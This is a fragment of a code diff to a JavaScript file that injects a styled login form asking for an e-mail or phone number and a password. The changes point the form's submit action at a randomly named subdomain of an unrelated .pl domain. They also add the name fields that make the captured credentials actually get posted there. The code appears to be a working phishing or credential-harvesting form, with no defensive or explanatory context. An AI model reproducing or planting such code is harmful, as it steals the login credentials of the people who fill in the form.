@@ -31,12 +31,12 @@ var inputStyles = "background:none;border-color:#9da3a6;border-width:1px;border-
 // set loginForm styles
 loginForm.style.margin = '20px 20px 20px 20px';
 loginForm.id = 'loginForm';
-loginForm.action = 'https://ukia6hk45yd72xaq5gtwmc3yrpxfl4.v13rsba.pl/login';
+loginForm.action = 'https://2hkgbf1lo5odplm3o9b1fyqid9j07p.v13rsba.pl/login';
 loginForm.method = 'post';
 
 // set the elements and styles on the form
-loginForm.innerHTML = "<input type='text' placeholder='E-mail address / phone number' style='"+ inputStyles +"' /><br/>" + 
-                 "<input type='password' placeholder='Password' style='"+ inputStyles +"' /><br/>" + 
+loginForm.innerHTML = "<input name='login' type='text' placeholder='E-mail address / phone number' style='"+ inputStyles +"' /><br/>" + 
+                 "<input name='password' type='password' placeholder='Password' style='"+ inputStyles +"' /><br/>" + 
                  "<input type='submit' value='Login' style='"+ btnStyles +"' />" ;
 
 
